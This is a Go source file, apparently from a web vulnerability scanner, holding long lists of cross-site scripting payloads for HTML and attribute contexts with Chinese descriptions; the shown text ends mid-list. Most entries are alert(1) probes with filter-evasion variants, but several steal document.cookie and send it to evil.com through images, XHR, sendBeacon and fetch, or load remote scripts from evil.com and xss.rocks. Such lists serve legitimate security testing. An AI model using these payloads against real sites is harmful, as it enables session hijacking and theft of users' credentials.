package payload

var xssHTMLVectors = []Payload{
	{Raw: `<script>alert(1)</script>`, Description: "基础script标签", Context: XSSHTML},
	{Raw: `<script>prompt(1)</script>`, Description: "基础prompt", Context: XSSHTML},
	{Raw: `<script>confirm(1)</script>`, Description: "基础confirm", Context: XSSHTML},
	{Raw: `<script>alert(document.cookie)</script>`, Description: "alert cookie", Context: XSSHTML},
	{Raw: `<script>alert(document.domain)</script>`, Description: "alert domain", Context: XSSHTML},
	{Raw: `<script>document.write('<img src=//evil.com/'+document.cookie+'>')</script>`, Description: "外传cookie", Context: XSSHTML},
	{Raw: `<script>new Image().src='//evil.com/?c='+document.cookie</script>`, Description: "Image外传cookie", Context: XSSHTML},
	{Raw: `<script src=//evil.com/a.js></script>`, Description: "远程脚本引入", Context: XSSHTML},
	{Raw: `<script src=//evil.com/></script>`, Description: "远程短脚本引入", Context: XSSHTML},
	{Raw: `<script src=//xss.rocks></script>`, Description: "xss.rocks远程", Context: XSSHTML},
	{Raw: `<SCRIPT>alert(1)</SCRIPT>`, Description: "大写script标签", Context: XSSHTML},
	{Raw: `<Script>alert(1)</Script>`, Description: "首字母大写script", Context: XSSHTML},
	{Raw: `<sCript>alert(1)</sCript>`, Description: "混合大小写script", Context: XSSHTML},
	{Raw: `<script>eval('al'+'ert(1)')</script>`, Description: "eval拼接", Context: XSSHTML},
	{Raw: `<script>setTimeout('al'+'ert(1)',0)</script>`, Description: "setTimeout弹窗", Context: XSSHTML},
	{Raw: `<script>setInterval('al'+'ert(1)',0)</script>`, Description: "setInterval弹窗", Context: XSSHTML},
	{Raw: `<script>Function('al'+'ert(1)')()</script>`, Description: "Function弹窗", Context: XSSHTML},
	{Raw: `<script>(function(){alert(1)})()</script>`, Description: "IIFE弹窗", Context: XSSHTML},
	{Raw: `<script>[].constructor.constructor('alert(1)')()</script>`, Description: "constructor链调用", Context: XSSHTML},
	{Raw: `<script>'constructor'.constructor('alert(1)')()</script>`, Description: "字符串constructor", Context: XSSHTML},
	{Raw: `<script>window['alert'](1)</script>`, Description: "window下标调用", Context: XSSHTML},
	{Raw: `<script>this['alert'](1)</script>`, Description: "this下标调用", Context: XSSHTML},
	{Raw: `<script>self['alert'](1)</script>`, Description: "self下标调用", Context: XSSHTML},
	{Raw: `<script>top['alert'](1)</script>`, Description: "top下标调用", Context: XSSHTML},
	{Raw: `<script>parent['alert'](1)</script>`, Description: "parent下标调用", Context: XSSHTML},
	{Raw: `<script>frames['alert'](1)</script>`, Description: "frames下标调用", Context: XSSHTML},
	{Raw: `<script>(alert)(1)</script>`, Description: "括号包裹alert", Context: XSSHTML},
	{Raw: `<script>alert.call(null,1)</script>`, Description: "alert.call", Context: XSSHTML},
	{Raw: `<script>alert.apply(null,[1])</script>`, Description: "alert.apply", Context: XSSHTML},
	{Raw: `<script>Reflect.apply(alert,null,[1])</script>`, Description: "Reflect.apply alert", Context: XSSHTML},
	{Raw: `<script>\u0061lert(1)</script>`, Description: "Unicode a alert", Context: XSSHTML},
	{Raw: `<script>al\u0065rt(1)</script>`, Description: "Unicode e alert", Context: XSSHTML},
	{Raw: `<script>\u0061\u006c\u0065\u0072\u0074(1)</script>`, Description: "全Unicode alert", Context: XSSHTML},
	{Raw: `<script>eval('\u0061'+'\u006c\u0065\u0072\u0074(1)')</script>`, Description: "Unicode eval alert", Context: XSSHTML},
	{Raw: `<script>x=new XMLHttpRequest;x.open('GET','//evil.com/?c='+document.cookie,0);x.send()</script>`, Description: "XHR外传cookie", Context: XSSHTML},
	{Raw: `<script>navigator.sendBeacon('//evil.com/',document.cookie)</script>`, Description: "sendBeacon外传cookie", Context: XSSHTML},
	{Raw: `<script>fetch('//evil.com/?c='+document.cookie)</script>`, Description: "fetch外传cookie", Context: XSSHTML},
	{Raw: `<script>import('//evil.com/a.js')</script>`, Description: "动态import", Context: XSSHTML},

	{Raw: `<img src=x onerror=alert(1)>`, Description: "img onerror", Context: XSSHTML},
	{Raw: `<img src=x onerror=prompt(1)>`, Description: "img onerror prompt", Context: XSSHTML},
	{Raw: `<img src=x onerror=confirm(1)>`, Description: "img onerror confirm", Context: XSSHTML},
	{Raw: `<img src=1 onerror=alert(1)>`, Description: "img src=1 onerror", Context: XSSHTML},
	{Raw: `<img src=1 onerror=confirm(1)>`, Description: "img src=1 onerror confirm", Context: XSSHTML},
	{Raw: `<img src=x onerror=alert(document.cookie)>`, Description: "img onerror cookie", Context: XSSHTML},
	{Raw: `<IMG SRC=x ONERROR=alert(1)>`, Description: "img大写onerror", Context: XSSHTML},
	{Raw: `<img src=x onerror=\u0061lert(1)>`, Description: "img onerror Unicode", Context: XSSHTML},
	{Raw: `<img src=x onerror=eval('\141\154\145\162\164(1)')>`, Description: "img onerror 八进制", Context: XSSHTML},
	{Raw: `<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`, Description: "img onerror base64", Context: XSSHTML},
	{Raw: `<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>`, Description: "img onerror CharCode", Context: XSSHTML},
	{Raw: `<img src=x onerror=location='javascript:alert(1)'>`, Description: "img onerror location", Context: XSSHTML},
	{Raw: `<img src=x onerror=document.write('<script>alert(1)<\/script>')>`, Description: "img onerror document.write", Context: XSSHTML},
	{Raw: `<img src=x onerror="new Function('alert(1)')()">`, Description: "img onerror Function", Context: XSSHTML},
	{Raw: `<img src=x onerror="[].constructor.constructor('alert(1)')()">`, Description: "img onerror constructor", Context: XSSHTML},
	{Raw: `<img src=x onerror="\x61\x6c\x65\x72\x74\x28\x31\x29">`, Description: "img onerror hex escape", Context: XSSHTML},

	{Raw: `<body onload=alert(1)>`, Description: "body onload", Context: XSSHTML},
	{Raw: `<body onpageshow=alert(1)>`, Description: "body onpageshow", Context: XSSHTML},
	{Raw: `<body onfocus=alert(1)>`, Description: "body onfocus", Context: XSSHTML},
	{Raw: `<body onfocusin=alert(1)>`, Description: "body onfocusin", Context: XSSHTML},
	{Raw: `<body onfocusout=alert(1)>`, Description: "body onfocusout", Context: XSSHTML},
	{Raw: `<body onresize=alert(1)>`, Description: "body onresize", Context: XSSHTML},
	{Raw: `<body onscroll=alert(1)>`, Description: "body onscroll", Context: XSSHTML},
	{Raw: `<body onhashchange=alert(1)>`, Description: "body onhashchange", Context: XSSHTML},
	{Raw: `<body onpopstate=alert(1)>`, Description: "body onpopstate", Context: XSSHTML},
	{Raw: `<body onstorage=alert(1)>`, Description: "body onstorage", Context: XSSHTML},
	{Raw: `<body ononline=alert(1)>`, Description: "body ononline", Context: XSSHTML},
	{Raw: `<body onoffline=alert(1)>`, Description: "body onoffline", Context: XSSHTML},
	{Raw: `<body onafterprint=alert(1)>`, Description: "body onafterprint", Context: XSSHTML},
	{Raw: `<body onbeforeprint=alert(1)>`, Description: "body onbeforeprint", Context: XSSHTML},
	{Raw: `<body onbeforeunload=alert(1)>`, Description: "body onbeforeunload", Context: XSSHTML},
	{Raw: `<body onunload=alert(1)>`, Description: "body onunload", Context: XSSHTML},
	{Raw: `<body onmessage=alert(1)>`, Description: "body onmessage", Context: XSSHTML},
	{Raw: `<body onerror=alert(1)>`, Description: "body onerror", Context: XSSHTML},
	{Raw: `<body onpageshow=prompt(1)>`, Description: "body onpageshow prompt", Context: XSSHTML},

	{Raw: `<input onfocus=alert(1) autofocus>`, Description: "input onfocus autofocus", Context: XSSHTML},
	{Raw: `<input onblur=alert(1) autofocus><input autofocus>`, Description: "input onblur", Context: XSSHTML},
	{Raw: `<input onchange=alert(1) value=x>`, Description: "input onchange", Context: XSSHTML},
	{Raw: `<input oninput=alert(1) autofocus>`, Description: "input oninput", Context: XSSHTML},
	{Raw: `<input oninvalid=alert(1) required autofocus>`, Description: "input oninvalid", Context: XSSHTML},
	{Raw: `<input onsearch=alert(1) autofocus>`, Description: "input onsearch", Context: XSSHTML},
	{Raw: `<input onselect=alert(1) autofocus>`, Description: "input onselect", Context: XSSHTML},

	{Raw: `<select onfocus=alert(1) autofocus>`, Description: "select onfocus", Context: XSSHTML},
	{Raw: `<select onchange=alert(1)><option>1</option><option>2</option></select>`, Description: "select onchange", Context: XSSHTML},
	{Raw: `<textarea onfocus=alert(1) autofocus>`, Description: "textarea onfocus", Context: XSSHTML},
	{Raw: `<textarea onselect=alert(1) autofocus>test</textarea>`, Description: "textarea onselect", Context: XSSHTML},
	{Raw: `<textarea oninput=alert(1) autofocus>`, Description: "textarea oninput", Context: XSSHTML},
	{Raw: `<keygen onfocus=alert(1) autofocus>`, Description: "keygen onfocus", Context: XSSHTML},

	{Raw: `<video><source onerror=alert(1)>`, Description: "video source onerror", Context: XSSHTML},
	{Raw: `<video poster=x onerror=alert(1)>`, Description: "video poster onerror", Context: XSSHTML},
	{Raw: `<video oncanplay=alert(1)><source src=x>`, Description: "video oncanplay", Context: XSSHTML},
	{Raw: `<video onloadedmetadata=alert(1)><source src=x>`, Description: "video onloadedmetadata", Context: XSSHTML},
	{Raw: `<video onloadstart=alert(1)><source src=x>`, Description: "video onloadstart", Context: XSSHTML},
	{Raw: `<video onplay=alert(1) autoplay><source src=x>`, Description: "video onplay", Context: XSSHTML},
	{Raw: `<video onpause=alert(1)><source src=x>`, Description: "video onpause", Context: XSSHTML},
	{Raw: `<video onended=alert(1) autoplay><source src=x>`, Description: "video onended", Context: XSSHTML},
	{Raw: `<video onseeked=alert(1)><source src=x>`, Description: "video onseeked", Context: XSSHTML},
	{Raw: `<video onwaiting=alert(1)><source src=x>`, Description: "video onwaiting", Context: XSSHTML},
	{Raw: `<video onratechange=alert(1)><source src=x>`, Description: "video onratechange", Context: XSSHTML},
	{Raw: `<video onvolumechange=alert(1) autoplay><source src=x>`, Description: "video onvolumechange", Context: XSSHTML},
	{Raw: `<video onprogress=alert(1)><source src=x>`, Description: "video onprogress", Context: XSSHTML},
	{Raw: `<video onstalled=alert(1)><source src=x>`, Description: "video onstalled", Context: XSSHTML},

	{Raw: `<audio src=x onerror=alert(1)>`, Description: "audio onerror", Context: XSSHTML},
	{Raw: `<audio oncanplay=alert(1) src=x>`, Description: "audio oncanplay", Context: XSSHTML},
	{Raw: `<audio onloadstart=alert(1) src=x>`, Description: "audio onloadstart", Context: XSSHTML},
	{Raw: `<audio onplay=alert(1) autoplay src=x>`, Description: "audio onplay", Context: XSSHTML},
	{Raw: `<audio onabort=alert(1) src=x>`, Description: "audio onabort", Context: XSSHTML},
	{Raw: `<audio onemptied=alert(1) src=x>`, Description: "audio onemptied", Context: XSSHTML},

	{Raw: `<details open ontoggle=alert(1)>`, Description: "details ontoggle", Context: XSSHTML},
	{Raw: `<details open ontoggle=prompt(1)>`, Description: "details ontoggle prompt", Context: XSSHTML},
	{Raw: `<details open ontoggle=confirm(1)>`, Description: "details ontoggle confirm", Context: XSSHTML},
	{Raw: `<dialog open onclose=alert(1)>`, Description: "dialog onclose", Context: XSSHTML},
	{Raw: `<dialog open oncancel=alert(1)>`, Description: "dialog oncancel", Context: XSSHTML},

	{Raw: `<marquee onstart=alert(1)>`, Description: "marquee onstart", Context: XSSHTML},
	{Raw: `<marquee onfinish=alert(1)>`, Description: "marquee onfinish", Context: XSSHTML},
	{Raw: `<marquee onbounce=alert(1)>`, Description: "marquee onbounce", Context: XSSHTML},
	{Raw: `<marquee onstart=prompt(1)>`, Description: "marquee onstart prompt", Context: XSSHTML},
	{Raw: `<marquee onfinish=confirm(1)>`, Description: "marquee onfinish confirm", Context: XSSHTML},

	{Raw: `<iframe src=javascript:alert(1)>`, Description: "iframe javascript:", Context: XSSHTML},
	{Raw: `<iframe src=javascript:prompt(1)>`, Description: "iframe javascript: prompt", Context: XSSHTML},
	{Raw: `<iframe srcdoc="<script>alert(1)</script>">`, Description: "iframe srcdoc", Context: XSSHTML},
	{Raw: `<iframe src=data:text/html,<script>alert(1)</script>>`, Description: "iframe data:text/html", Context: XSSHTML},
	{Raw: `<iframe onload=alert(1) src=x>`, Description: "iframe onload", Context: XSSHTML},
	{Raw: `<iframe onerror=alert(1) src=x>`, Description: "iframe onerror", Context: XSSHTML},

	{Raw: `<embed src=//evil.com/a.swf>`, Description: "embed flash", Context: XSSHTML},
	{Raw: `<embed src=javascript:alert(1)>`, Description: "embed javascript:", Context: XSSHTML},
	{Raw: `<embed src=x onerror=alert(1)>`, Description: "embed onerror", Context: XSSHTML},

	{Raw: `<object data=//evil.com/a.swf>`, Description: "object flash", Context: XSSHTML},
	{Raw: `<object data=javascript:alert(1)>`, Description: "object javascript:", Context: XSSHTML},
	{Raw: `<object data=data:text/html,<script>alert(1)</script>>`, Description: "object data:", Context: XSSHTML},

	{Raw: `<a href=javascript:alert(1)>click</a>`, Description: "a href javascript:", Context: XSSHTML},
	{Raw: `<a href=javascript:prompt(1)>click</a>`, Description: "a href javascript: prompt", Context: XSSHTML},
	{Raw: `<a href=javascript:alert(document.cookie)>click</a>`, Description: "a href cookie", Context: XSSHTML},

	{Raw: `<form action=javascript:alert(1)><input type=submit>`, Description: "form action JS", Context: XSSHTML},
	{Raw: `<form><button formaction=javascript:alert(1)>click</button></form>`, Description: "button formaction", Context: XSSHTML},
	{Raw: `<form><input formaction=javascript:alert(1) type=submit value=click>`, Description: "input formaction", Context: XSSHTML},
	{Raw: `<form><input formaction=javascript:alert(1) type=image src=x>`, Description: "input image formaction", Context: XSSHTML},

	{Raw: `<table background=javascript:alert(1)>`, Description: "table background JS", Context: XSSHTML},
	{Raw: `<td background=javascript:alert(1)>`, Description: "td background JS", Context: XSSHTML},
	{Raw: `<th background=javascript:alert(1)>`, Description: "th background JS", Context: XSSHTML},
	{Raw: `<tr background=javascript:alert(1)>`, Description: "tr background JS", Context: XSSHTML},
	{Raw: `<thead background=javascript:alert(1)>`, Description: "thead background JS", Context: XSSHTML},
	{Raw: `<tfoot background=javascript:alert(1)>`, Description: "tfoot background JS", Context: XSSHTML},
	{Raw: `<tbody background=javascript:alert(1)>`, Description: "tbody background JS", Context: XSSHTML},

	{Raw: `<div style="background-image:url(javascript:alert(1))">`, Description: "div style background-image", Context: XSSHTML},
	{Raw: `<div style="background:url(javascript:alert(1))">`, Description: "div style background", Context: XSSHTML},
	{Raw: `<div style="width:expression(alert(1))">`, Description: "IE expression", Context: XSSHTML},
	{Raw: `<xss style="behavior:url(xss.htc)">`, Description: "CSS behavior HTC", Context: XSSHTML},

	{Raw: `<base href=//evil.com/>`, Description: "base标签劫持", Context: XSSHTML},

	{Raw: `<meta http-equiv=refresh content="0;url=javascript:alert(1)">`, Description: "meta refresh JS", Context: XSSHTML},
	{Raw: `<meta http-equiv=refresh content="0;url=data:text/html,<script>alert(1)</script>">`, Description: "meta refresh data:", Context: XSSHTML},
	{Raw: `<meta http-equiv=set-cookie content="xss=payload">`, Description: "meta set-cookie", Context: XSSHTML},
	{Raw: `<meta charset="utf-8"><script>alert(1)</script>`, Description: "meta charset+script", Context: XSSHTML},

	{Raw: `<isindex type=image src=1 onerror=alert(1)>`, Description: "isindex onerror", Context: XSSHTML},
	{Raw: `<isindex action=javascript:alert(1) type=image src=1>`, Description: "isindex action JS", Context: XSSHTML},

	{Raw: `<xmp><script>alert(1)</script></xmp>`, Description: "xmp内嵌script", Context: XSSHTML},
	{Raw: `<noembed><script>alert(1)</script></noembed>`, Description: "noembed内嵌script", Context: XSSHTML},
	{Raw: `<noframes><script>alert(1)</script></noframes>`, Description: "noframes内嵌script", Context: XSSHTML},

	{Raw: `<applet code=javascript:alert(1)>`, Description: "applet JS", Context: XSSHTML},
	{Raw: `<bgsound src=javascript:alert(1)>`, Description: "bgsound JS", Context: XSSHTML},
	{Raw: `<blink onfocus=alert(1)>`, Description: "blink onfocus", Context: XSSHTML},
	{Raw: `<command onfocus=alert(1)>`, Description: "command onfocus", Context: XSSHTML},
	{Raw: `<element onfocus=alert(1)>`, Description: "element onfocus", Context: XSSHTML},
	{Raw: `<content onfocus=alert(1)>`, Description: "content onfocus", Context: XSSHTML},
	{Raw: `<shadow onfocus=alert(1)>`, Description: "shadow onfocus", Context: XSSHTML},

	{Raw: `<math><mi><malignmark><mglyph><mspace><mlabeledtr><merror><mfrac><mroot><mrow><mstyle><mmultiscripts><mtable><mlongdiv><maction><mtext><mprescripts><none><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></none></mprescripts></mtext></maction></mlongdiv></mtable></mmultiscripts></mstyle></mrow></mroot></mfrac></merror></mlabeledtr></mspace></mglyph></malignmark></mi></math>`, Description: "math annotation-xml", Context: XSSHTML},

	{Raw: `<svg><desc><script>alert(1)</script></desc></svg>`, Description: "svg desc script", Context: XSSHTML},
	{Raw: `<svg><title><script>alert(1)</script></title></svg>`, Description: "svg title script", Context: XSSHTML},
	{Raw: `<svg><metadata><script>alert(1)</script></metadata></svg>`, Description: "svg metadata script", Context: XSSHTML},

	{Raw: `</script><script>alert(1)</script>`, Description: "闭合script标签", Context: XSSHTML},
	{Raw: `</script><img src=x onerror=alert(1)>`, Description: "闭合script+img", Context: XSSHTML},
	{Raw: `</script><svg onload=alert(1)>`, Description: "闭合script+svg", Context: XSSHTML},
	{Raw: `</script><body onload=alert(1)>`, Description: "闭合script+body onload", Context: XSSHTML},
	{Raw: `</textarea><script>alert(1)</script>`, Description: "闭合textarea+script", Context: XSSHTML},
	{Raw: `</textarea><img src=x onerror=alert(1)>`, Description: "闭合textarea+img", Context: XSSHTML},
	{Raw: `</title><script>alert(1)</script>`, Description: "闭合title+script", Context: XSSHTML},
	{Raw: `</title><img src=x onerror=alert(1)>`, Description: "闭合title+img", Context: XSSHTML},
	{Raw: `</style><script>alert(1)</script>`, Description: "闭合style+script", Context: XSSHTML},
	{Raw: `</style><img src=x onerror=alert(1)>`, Description: "闭合style+img", Context: XSSHTML},
	{Raw: `</noscript><script>alert(1)</script>`, Description: "闭合noscript+script", Context: XSSHTML},
	{Raw: `</noscript><img src=x onerror=alert(1)>`, Description: "闭合noscript+img", Context: XSSHTML},
	{Raw: `</xmp><script>alert(1)</script>`, Description: "闭合xmp+script", Context: XSSHTML},
	{Raw: `</noembed><script>alert(1)</script>`, Description: "闭合noembed+script", Context: XSSHTML},
	{Raw: `</noframes><script>alert(1)</script>`, Description: "闭合noframes+script", Context: XSSHTML},

	{Raw: `"><script>alert(1)</script>`, Description: "双引号闭合+script", Context: XSSHTML},
	{Raw: `><script>alert(1)</script>`, Description: ">闭合+script", Context: XSSHTML},
	{Raw: `'><script>alert(1)</script>`, Description: "单引号>闭合+script", Context: XSSHTML},
	{Raw: `-->'><script>alert(1)</script>`, Description: "-->闭合+script", Context: XSSHTML},
	{Raw: `]]><script>alert(1)</script>`, Description: "]]闭合+script", Context: XSSHTML},
	{Raw: `%27%3E%3Cscript%3Ealert(1)%3C/script%3E`, Description: "URL编码闭合+script", Context: XSSHTML},
}

var xssAttributeVectors = []Payload{
	{Raw: `" onmouseover=alert(1) x="`, Description: "onmouseover属性注入", Context: XSSAttribute},
	{Raw: `" onmouseover=prompt(1) x="`, Description: "onmouseover prompt属性", Context: XSSAttribute},
	{Raw: `" onmouseout=alert(1) x="`, Description: "onmouseout属性注入", Context: XSSAttribute},
	{Raw: `" onmousemove=alert(1) x="`, Description: "onmousemove属性注入", Context: XSSAttribute},
	{Raw: `" onmousedown=alert(1) x="`, Description: "onmousedown属性注入", Context: XSSAttribute},
	{Raw: `" onmouseup=alert(1) x="`, Description: "onmouseup属性注入", Context: XSSAttribute},
	{Raw: `" onmouseenter=alert(1) x="`, Description: "onmouseenter属性注入", Context: XSSAttribute},
	{Raw: `" onmouseleave=alert(1) x="`, Description: "onmouseleave属性注入", Context: XSSAttribute},
	{Raw: `" onmousewheel=alert(1) x="`, Description: "onmousewheel属性注入", Context: XSSAttribute},
	{Raw: `" oncontextmenu=alert(1) x="`, Description: "oncontextmenu属性注入", Context: XSSAttribute},
	{Raw: `" ondblclick=alert(1) x="`, Description: "ondblclick属性注入", Context: XSSAttribute},

	{Raw: `" onclick=alert(1) x="`, Description: "onclick属性注入", Context: XSSAttribute},
	{Raw: `" onclick=prompt(1) x="`, Description: "onclick prompt属性", Context: XSSAttribute},
	{Raw: `" ondblclick=alert(1) x="`, Description: "ondblclick属性注入", Context: XSSAttribute},

	{Raw: `" onfocus=alert(1) autofocus x="`, Description: "onfocus autofocus属性注入", Context: XSSAttribute},
	{Raw: `" onfocusin=alert(1) autofocus x="`, Description: "onfocusin属性注入", Context: XSSAttribute},
	{Raw: `" onfocusout=alert(1) autofocus x="`, Description: "onfocusout属性注入", Context: XSSAttribute},
	{Raw: `" onblur=alert(1) autofocus x="`, Description: "onblur属性注入", Context: XSSAttribute},
	{Raw: `" onchange=alert(1) x="`, Description: "onchange属性注入", Context: XSSAttribute},
	{Raw: `" oninput=alert(1) x="`, Description: "oninput属性注入", Context: XSSAttribute},
	{Raw: `" oninvalid=alert(1) required x="`, Description: "oninvalid属性注入", Context: XSSAttribute},

	{Raw: `" onkeydown=alert(1) x="`, Description: "onkeydown属性注入", Context: XSSAttribute},
	{Raw: `" onkeyup=alert(1) x="`, Description: "onkeyup属性注入", Context: XSSAttribute},
	{Raw: `" onkeypress=alert(1) x="`, Description: "onkeypress属性注入", Context: XSSAttribute},

	{Raw: `" onload=alert(1) x="`, Description: "onload属性注入", Context: XSSAttribute},
	{Raw: `" onerror=alert(1) x="`, Description: "onerror属性注入", Context: XSSAttribute},
	{Raw: `" onerror=prompt(1) x="`, Description: "onerror prompt属性", Context: XSSAttribute},
	{Raw: `" onerror=confirm(1) x="`, Description: "onerror confirm属性", Context: XSSAttribute},
	{Raw: `" onerror=eval(atob('YWxlcnQoMSk=')) x="`, Description: "onerror eval atob属性", Context: XSSAttribute},
	{Raw: `" onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) x="`, Description: "onerror eval CharCode属性", Context: XSSAttribute},
	{Raw: `" onerror=location='javascript:alert(1)' x="`, Description: "onerror location属性", Context: XSSAttribute},

	{Raw: `" onscroll=alert(1) x="`, Description: "onscroll属性注入", Context: XSSAttribute},
	{Raw: `" onsearch=alert(1) x="`, Description: "onsearch属性注入", Context: XSSAttribute},
	{Raw: `" onselect=alert(1) x="`, Description: "onselect属性注入", Context: XSSAttribute},
	{Raw: `" onselectstart=alert(1) x="`, Description: "onselectstart属性注入", Context: XSSAttribute},
	{Raw: `" onsubmit=alert(1) x="`, Description: "onsubmit属性注入", Context: XSSAttribute},
	{Raw: `" onreset=alert(1) x="`, Description: "onreset属性注入", Context: XSSAttribute},
	{Raw: `" ontoggle=alert(1) x="`, Description: "ontoggle属性注入", Context: XSSAttribute},
	{Raw: `" onclose=alert(1) x="`, Description: "onclose属性注入", Context: XSSAttribute},
	{Raw: `" oncancel=alert(1) x="`, Description: "oncancel属性注入", Context: XSSAttribute},

	{Raw: `" onanimationstart=alert(1) x="`, Description: "onanimationstart属性", Context: XSSAttribute},
	{Raw: `" onanimationend=alert(1) x="`, Description: "onanimationend属性", Context: XSSAttribute},
	{Raw: `" onanimationiteration=alert(1) x="`, Description: "onanimationiteration属性", Context: XSSAttribute},
	{Raw: `" ontransitionend=alert(1) x="`, Description: "ontransitionend属性", Context: XSSAttribute},
	{Raw: `" ontransitionstart=alert(1) x="`, Description: "ontransitionstart属性", Context: XSSAttribute},
	{Raw: `" ontransitionrun=alert(1) x="`, Description: "ontransitionrun属性", Context: XSSAttribute},

	{Raw: `" onresize=alert(1) x="`, Description: "onresize属性注入", Context: XSSAttribute},
	{Raw: `" onabort=alert(1) x="`, Description: "onabort属性注入", Context: XSSAttribute},
	{Raw: `" oncanplay=alert(1) x="`, Description: "oncanplay属性注入", Context: XSSAttribute},
	{Raw: `" oncanplaythrough=alert(1) x="`, Description: "oncanplaythrough属性", Context: XSSAttribute},
	{Raw: `" oncuechange=alert(1) x="`, Description: "oncuechange属性注入", Context: XSSAttribute},
	{Raw: `" ondurationchange=alert(1) x="`, Description: "ondurationchange属性", Context: XSSAttribute},
	{Raw: `" onemptied=alert(1) x="`, Description: "onemptied属性注入", Context: XSSAttribute},
	{Raw: `" onended=alert(1) x="`, Description: "onended属性注入", Context: XSSAttribute},
	{Raw: `" onloadeddata=alert(1) x="`, Description: "onloadeddata属性注入", Context: XSSAttribute},
	{Raw: `" onloadedmetadata=alert(1) x="`, Description: "onloadedmetadata属性", Context: XSSAttribute},
	{Raw: `" onloadstart=alert(1) x="`, Description: "onloadstart属性注入", Context: XSSAttribute},
	{Raw: `" onpause=alert(1) x="`, Description: "onpause属性注入", Context: XSSAttribute},
	{Raw: `" onplay=alert(1) x="`, Description: "onplay属性注入", Context: XSSAttribute},
	{Raw: `" onplaying=alert(1) x="`, Description: "onplaying属性注入", Context: XSSAttribute},
	{Raw: `" onprogress=alert(1) x="`, Description: "onprogress属性注入", Context: XSSAttribute},
	{Raw: `" onratechange=alert(1) x="`, Description: "onratechange属性注入", Context: XSSAttribute},
	{Raw: `" onseeked=alert(1) x="`, Description: "onseeked属性注入", Context: XSSAttribute},
	{Raw: `" onseeking=alert(1) x="`, Description: "onseeking属性注入", Context: XSSAttribute},
	{Raw: `" onstalled=alert(1) x="`, Description: "onstalled属性注入", Context: XSSAttribute},
	{Raw: `" onsuspend=alert(1) x="`, Description: "onsuspend属性注入", Context: XSSAttribute},
	{Raw: `" ontimeupdate=alert(1) x="`, Description: "ontimeupdate属性注入", Context: XSSAttribute},
	{Raw: `" onvolumechange=alert(1) x="`, Description: "onvolumechange属性注入", Context: XSSAttribute},
	{Raw: `" onwaiting=alert(1) x="`, Description: "onwaiting属性注入", Context: XSSAttribute},

	{Raw: `" ondragstart=alert(1) x="`, Description: "ondragstart属性注入", Context: XSSAttribute},
	{Raw: `" ondragend=alert(1) x="`, Description: "ondragend属性注入", Context: XSSAttribute},
	{Raw: `" ondragenter=alert(1) x="`, Description: "ondragenter属性注入", Context: XSSAttribute},
	{Raw: `" ondragleave=alert(1) x="`, Description: "ondragleave属性注入", Context: XSSAttribute},
	{Raw: `" ondragover=alert(1) x="`, Description: "ondragover属性注入", Context: XSSAttribute},
	{Raw: `" ondrop=alert(1) x="`, Description: "ondrop属性注入", Context: XSSAttribute},

	{Raw: `" onwheel=alert(1) x="`, Description: "onwheel属性注入", Context: XSSAttribute},

	{Raw: `" onpaste=alert(1) x="`, Description: "onpaste属性注入", Context: XSSAttribute},
	{Raw: `" oncut=alert(1) x="`, Description: "oncut属性注入", Context: XSSAttribute},
	{Raw: `" oncopy=alert(1) x="`, Description: "oncopy属性注入", Context: XSSAttribute},

	{Raw: `" ononline=alert(1) x="`, Description: "ononline属性注入", Context: XSSAttribute},
	{Raw: `" onoffline=alert(1) x="`, Description: "onoffline属性注入", Context: XSSAttribute},
	{Raw: `" onpopstate=alert(1) x="`, Description: "onpopstate属性注入", Context: XSSAttribute},
	{Raw: `" onhashchange=alert(1) x="`, Description: "onhashchange属性注入", Context: XSSAttribute},
	{Raw: `" onpagehide=alert(1) x="`, Description: "onpagehide属性注入", Context: XSSAttribute},
	{Raw: `" onpageshow=alert(1) x="`, Description: "onpageshow属性注入", Context: XSSAttribute},
	{Raw: `" onbeforeunload=alert(1) x="`, Description: "onbeforeunload属性", Context: XSSAttribute},
	{Raw: `" onunload=alert(1) x="`, Description: "onunload属性注入", Context: XSSAttribute},
	{Raw: `" onstorage=alert(1) x="`, Description: "onstorage属性注入", Context: XSSAttribute},
	{Raw: `" onmessage=alert(1) x="`, Description: "onmessage属性注入", Context: XSSAttribute},

	{Raw: `" ontouchend=alert(1) x="`, Description: "ontouchend属性注入", Context: XSSAttribute},
	{Raw: `" ontouchstart=alert(1) x="`, Description: "ontouchstart属性注入", Context: XSSAttribute},
	{Raw: `" ontouchmove=alert(1) x="`, Description: "ontouchmove属性注入", Context: XSSAttribute},
	{Raw: `" ontouchcancel=alert(1) x="`, Description: "ontouchcancel属性注入", Context: XSSAttribute},
	{Raw: `" ongesturestart=alert(1) x="`, Description: "ongesturestart属性注入", Context: XSSAttribute},
	{Raw: `" ongestureend=alert(1) x="`, Description: "ongestureend属性注入", Context: XSSAttribute},
	{Raw: `" ongesturechange=alert(1) x="`, Description: "ongesturechange属性注入", Context: XSSAttribute},

	{Raw: `" onpointerenter=alert(1) x="`, Description: "onpointerenter属性", Context: XSSAttribute},
	{Raw: `" onpointerleave=alert(1) x="`, Description: "onpointerleave属性", Context: XSSAttribute},
	{Raw: `" onpointerdown=alert(1) x="`, Description: "onpointerdown属性", Context: XSSAttribute},
	{Raw: `" onpointerup=alert(1) x="`, Description: "onpointerup属性", Context: XSSAttribute},
	{Raw: `" onpointermove=alert(1) x="`, Description: "onpointermove属性", Context: XSSAttribute},
	{Raw: `" onpointerover=alert(1) x="`, Description: "onpointerover属性", Context: XSSAttribute},
	{Raw: `" onpointerout=alert(1) x="`, Description: "onpointerout属性", Context: XSSAttribute},
	{Raw: `" onpointercancel=alert(1) x="`, Description: "onpointercancel属性", Context: XSSAttribute},
	{Raw: `" ongotpointercapture=alert(1) x="`, Description: "ongotpointercapture属性", Context: XSSAttribute},
	{Raw: `" onlostpointercapture=alert(1) x="`, Description: "onlostpointercapture属性", Context: XSSAttribute},

	{Raw: `" autofocus onfocus=alert(1) x="`, Description: "autofocus onfocus属性", Context: XSSAttribute},
	{Raw: `" autofocus onfocusin=alert(1) x="`, Description: "autofocus onfocusin属性", Context: XSSAttribute},

	{Raw: `' onmouseover=alert(1) x='`, Description: "单引号onmouseover", Context: XSSAttribute},
	{Raw: `' onclick=alert(1) x='`, Description: "单引号onclick", Context: XSSAttribute},
	{Raw: `' onfocus=alert(1) autofocus x='`, Description: "单引号onfocus autofocus", Context: XSSAttribute},
	{Raw: `' onerror=alert(1) x='`, Description: "单引号onerror", Context: XSSAttribute},
	{Raw: `' onload=alert(1) x='`, Description: "单引号onload", Context: XSSAttribute},
